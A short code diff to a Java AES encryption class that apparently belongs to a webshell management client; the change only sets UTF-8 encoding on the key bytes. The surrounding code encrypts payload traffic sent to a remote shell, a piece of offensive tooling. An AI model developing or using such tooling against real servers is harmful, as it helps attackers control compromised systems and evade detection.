@@ -3,6 +3,7 @@ package shells.cryptions.JavaAes;
 import core.annotation.CryptionAnnotation;
 import core.imp.Cryption;
 import core.shell.ShellEntity;
+import java.nio.charset.StandardCharsets;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import util.Log;
@@ -30,8 +31,8 @@ public class JavaAesRaw implements Cryption {
       try {
          this.encodeCipher = Cipher.getInstance("AES");
          this.decodeCipher = Cipher.getInstance("AES");
-         this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
-         this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
+         this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(StandardCharsets.UTF_8), "AES"));
+         this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(StandardCharsets.UTF_8), "AES"));
          this.payload = this.shell.getPayloadModule().getPayload();
          this.shell.getHeaders().put("Content-Type", "application/octet-stream");
          if (this.payload != null) {
